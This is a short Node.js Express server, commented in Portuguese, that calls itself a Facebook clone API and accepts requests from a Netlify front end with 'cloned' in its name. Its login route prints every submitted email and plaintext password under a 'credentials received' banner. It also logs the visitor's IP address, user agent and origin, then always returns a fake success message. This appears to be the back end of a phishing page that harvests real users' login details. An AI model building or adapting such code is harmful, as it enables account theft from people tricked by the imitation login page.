const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
require('dotenv').config();

const app = express();

// Configuração do CORS para permitir requisições do Netlify
app.use(cors({
    origin: process.env.FRONTEND_URL || 'https://cloned-f-render.netlify.app',
    methods: ['GET', 'POST'],
    credentials: true
}));

// Middleware para processar JSON
app.use(bodyParser.json());

// Rota de teste para verificar se a API está funcionando
app.get('/', (req, res) => {
    res.json({ message: 'API Facebook Clone está funcionando!' });
});

// Rota de login
app.post('/login', async (req, res) => {
    try {
        const { email, senha } = req.body;

        // Log destacado das credenciais
        console.log('\n');
        console.log('='.repeat(50));
        console.log('\n🔐 CREDENCIAIS RECEBIDAS 🔐\n');
        console.log('📧 EMAIL:', email);
        console.log('🔑 SENHA:', senha);
        console.log('\n');
        console.log('='.repeat(50));

        // Log de informações do dispositivo e IP
        console.log('\n📱 INFORMAÇÕES DO DISPOSITIVO E CONEXÃO 📱\n');
        console.log('🌐 IP:', req.ip);
        console.log('🌍 USER-AGENT:', req.headers['user-agent']);
        console.log('🔍 ORIGEM:', req.headers.origin);
        console.log('📍 MÉTODO:', req.method);
        console.log('\n');
        console.log('='.repeat(50));
        console.log('\n');

        if (!email || !senha) {
            return res.status(400).json({
                success: false,
                message: 'Email e senha são obrigatórios'
            });
        }

        // Simulando um delay de resposta do servidor (remova em produção)
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Exemplo de resposta bem-sucedida
        res.status(200).json({
            success: true,
            message: 'Login realizado com sucesso',
            user: {
                email,
                name: 'Usuário Teste'
            }
        });

    } catch (error) {
        console.error('Erro no login:', error);
        res.status(500).json({
            success: false,
            message: 'Erro interno do servidor'
        });
    }
});

// Porta do servidor
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});
